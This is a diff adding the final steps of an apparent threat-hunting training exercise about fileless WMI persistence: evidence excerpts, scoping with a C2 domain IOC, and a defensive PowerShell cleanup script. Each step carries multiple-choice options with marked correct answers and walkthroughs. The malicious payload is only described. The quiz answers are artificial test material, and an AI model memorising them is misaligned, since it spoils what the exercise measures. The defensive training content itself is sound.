+          'Sends event logs to the SIEM',
+        ],
+        correctIndex: 2,
+        hint: 'Read the uptime condition and the decoded payload.',
+        walkthrough: 'The filter fires when uptime is between 300 and 400 seconds, which is shortly after boot. The consumer pulls a remote script into memory and runs it, so nothing malicious stays on disk except the WMI repository entries. The domain is a new IOC for proxy and DNS hunting.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Expand scope with the new IOC',
+        evidence: r`Proxy and DNS logs (90 days) for cdn-perfstats.net:
+  7 hosts with the WMI subscription -> all contacted the domain
+  2 additional hosts contacted the domain but show no WMI events (Sysmon installed only 03-01 on those)
+First contact: 02-11 on FIN-WS22`,
+        question: 'How many hosts are in scope, and why?',
+        options: [
+          '7, only the hosts with WMI events',
+          '9: the 7 with the subscription plus 2 that contacted the C2 domain, whose WMI history predates their Sysmon coverage',
+          '2,400, the entire fleet',
+          '1, the first host only',
+        ],
+        correctIndex: 1,
+        hint: 'Different data sources have different coverage windows.',
+        walkthrough: 'Pivoting from one artefact to another (WMI to domain) finds hosts that a single data source missed. The two hosts with late Sysmon deployment may have had the subscription created before logging began. The earliest contact (02-11) tells you how far back to look for initial access.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Remediate safely',
+        evidence: r`Proposed cleanup script (per host):
+Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='PerfCounterSync'" | Remove-CimInstance
+Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='PerfCounterSync'" | Remove-CimInstance
+Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object {$_.Filter -match 'PerfCounterSync'} | Remove-CimInstance`,
+        question: 'What should happen before and alongside running this script?',
+        options: [
+          'Collect evidence first (WMI repository and memory from a sample of hosts), block the C2 domain, run the cleanup on the 9 scoped hosts, check them for other persistence and credential theft, and keep a detection for Sysmon 19-21 with unusual names',
+          'Run it immediately on all 2,400 hosts',
+          'Only block the domain',
+          'Reinstall Windows on the whole fleet',
+        ],
+        correctIndex: 0,
+        hint: 'Preserve, contain, remove, verify, and keep watching.',
+        walkthrough: 'Capture evidence before deleting it, cut off the C2 so the payload cannot download again, remove all three WMI objects on the scoped hosts, and check those hosts for anything else the payload installed. A standing detection on rare WMI subscriptions turns this hunt into ongoing monitoring.',
+      },
+    ],
+  },
 ];
